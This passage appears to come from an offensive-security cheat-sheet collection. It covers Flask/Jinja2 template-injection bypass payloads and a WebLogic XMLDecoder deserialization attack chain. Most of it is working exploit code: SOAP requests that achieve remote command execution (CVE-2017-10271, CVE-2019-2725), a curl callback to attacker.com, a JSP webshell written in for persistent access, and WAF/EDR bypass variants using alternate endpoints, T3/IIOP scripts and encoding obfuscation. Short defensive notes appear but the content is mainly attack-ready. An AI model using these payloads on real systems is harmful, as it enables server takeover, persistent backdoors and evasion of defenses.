{{''|attr('__class__')|attr('__mro__')}}

# Use request
{{request|attr('application')|attr('__globals__')}}

# Use string concatenation
{{'__cla'~'ss__'}}

# Use encoding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

**Overview:** Flask is Python's lightweight web framework; its security vulnerabilities mainly come from developers' insecure practices: Secret Key leakage leading to session forgery, Jinja2 SSTI, Debug mode RCE (the Werkzeug debugger), and insecure deserialization configuration.

**Vulnerability Principle:** Flask security risks: 1) in Debug mode the Werkzeug debugger can execute arbitrary Python code (a PIN is required, but the PIN can be computed via file reads) 2) Secret Key leakage leads to session cookie forgery 3) Jinja2 template injection (render_template_string) 4) insecure pickle session serialization.

**Exploitation Method:** Full exploitation flow:
1. Detect the Flask framework
2. Test for SSTI injection
3. Exploit debug mode
4. Or forge a session

**Defensive Measures:** Defensive measures:
1. Disable debug mode
2. Protect SECRET_KEY
3. Filter template injection
4. Input validation

---

### WebLogic XMLDecoder  `weblogic-xmldecoder`
_Exploiting the XMLDecoder deserialization vulnerability in WebLogic Server (CVE-2017-10271/CVE-2017-3506) to achieve remote code execution_
Subcategory: **WebLogic** · tags: `weblogic` `xmldecoder` `rce`

**Prerequisites:**
- The target runs WebLogic Server
- The /wls-wsat/ or /_async/ path exists
- The XMLDecoder component is not disabled
- The WebLogic version is vulnerable (10.3.6.0/12.1.3.0, etc.)

**Attack Chain:**

**Probe the WebLogic version and paths**
> Probe the WebLogic server version, open ports, and exploitable endpoints
_platform: linux_
```
# Detect the WebLogic console
curl -sI "http://target:7001/console/" | head -5

# Detect the wls-wsat endpoint (CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# Detect the AsyncResponseService endpoint (CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# Detect the T3 protocol
nmap -sV -p 7001 --script weblogic-t3-info target
```
**Syntax breakdown:**
- `/wls-wsat/CoordinatorPortType` — WebLogic WLS-WSAT component endpoint, CVE-2017-10271 exploitation point _value_
- `/_async/AsyncResponseService` — WebLogic asynchronous communication service endpoint, CVE-2019-2725 exploitation point _value_
- `weblogic-t3-info` — Nmap script to detect T3 protocol information _value_

**CVE-2017-10271 XMLDecoder RCE**
> Inject an XMLDecoder deserialization payload via the WorkContext in the SOAP request to achieve command execution
_platform: linux_
```
curl -v "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```
**Syntax breakdown:**
- `soapenv:Envelope` — root element of the SOAP message _value_
- `work:WorkContext` — WebLogic work context, the XMLDecoder parsing entry _value_
- `java.beans.XMLDecoder` — Java XML deserializer, the core component of the vulnerability _value_
- `java.lang.ProcessBuilder` — used to create an OS process to execute the command _value_
- `void method="start"` — calls ProcessBuilder.start() to execute the constructed command _command_

**CVE-2019-2725 deserialization RCE**
> Exploit the deserialization vulnerability in the _async endpoint to perform out-of-band (OOB) verification
_platform: linux_
```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```
**Syntax breakdown:**
- `/_async/AsyncResponseService` — asynchronous service endpoint, the CVE-2019-2725 attack entry _value_
- `wsa:Action` — WS-Addressing Action header, triggers asynchronous processing _value_
- `curl http://attacker.com/callback` — use curl for out-of-band verification of command execution results _command_

**Write a Webshell for persistent access**
> Use XMLDecoder's PrintWriter to write a JSP webshell to the WebLogic deployment directory
_platform: linux_
```
# Write a JSP Webshell via XMLDecoder
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# Verify the Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```
**Syntax breakdown:**
- `java.io.PrintWriter` — use the PrintWriter class to write the file _value_
- `servers/AdminServer/tmp/_WL_internal/...` — WebLogic internal web application deployment path _value_
- `CDATA` — XML CDATA section, prevents the JSP code from being processed by the XML parser _value_
- `/bea_wls_internal/test.jsp` — the Webshell's access URL path _value_

**WAF/EDR Bypass Variants:**

**Alternative deserialization endpoints**
> Try multiple different SOAP endpoints of the WebLogic WLS-WSAT component; some endpoints may not be covered by WAF rules
```
# Try different XMLDecoder entry points
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```
**Syntax breakdown:**
- `# Try different XMLDecoder entry points` — primary command _command_
- `...` — 6 lines total _value_

**T3/IIOP protocol bypass of HTTP-layer WAF**
> Use the T3 or IIOP protocol to send the deserialization payload, bypassing WAFs that only inspect HTTP traffic
```
# T3 protocol exploitation (bypasses HTTP-layer WAF)
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP protocol exploitation
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# Generate a T3 payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```
**Syntax breakdown:**
- `# T3 protocol exploitation (bypasses HTTP-layer WAF)` — primary command _command_
- `...` — 6 lines total _value_

**XML encoding obfuscation bypass**
> Obfuscate the payload content via XML encoding (UTF-16/CDATA/entity encoding) to bypass content-matching WAFs
```
<!-- UTF-16 encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA-wrapped keywords -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```
**Syntax breakdown:**
- `<!-- UTF-16 encoding bypass -->
` — XML content _value_
- `<?xml version="1.0" encoding="UTF-16"?>` — XML declaration/entity definition _tag_
- `

<!-- CDATA-wrapped keywords -->
<java>
  <object class="java.lang.Proc` — XML content _value_

**Overview:** WebLogic XMLDecoder deserialization is a series of severe RCE vulnerabilities (CVE-2017-3506/CVE-2017-10271/CVE-2019-2725). An attacker sends a carefully crafted SOAP XML request to the WLS-WSAT or AsyncResponseService endpoint and exploits XMLDecoder's deserialization of the WorkContext to execute arbitrary Java code, thereby achieving remote command execution.

**Vulnerability Principle:** WebLogic's WLS-WSAT and asynchronous communication services use XMLDecoder to parse the XML data in the WorkContext when handling SOAP requests. Because XMLDecoder can instantiate arbitrary Java classes and call their methods, an attacker can craft malicious XML to create ProcessBuilder or Runtime instances and execute OS commands.

**Exploitation Method:** Exploitation flow: 1) probe the target WebLogic version and open endpoints (/wls-wsat/, /_async/) 2) build a SOAP XML request with an XMLDecoder payload embedded in the WorkContext 3) use ProcessBuilder to execute a system command and verify RCE 4) write a Webshell via PrintWriter for persistent access 5) use the Webshell for follow-up operations

**Defensive Measures:** 1) upgrade to the latest patched version 2) remove or restrict access to the /wls-wsat/ and /_async/ endpoints 3) use a WAF to filter malicious XML in SOAP requests 4) restrict WebLogic's runtime privileges 5) monitor anomalous SOAP requests and file write operations

---
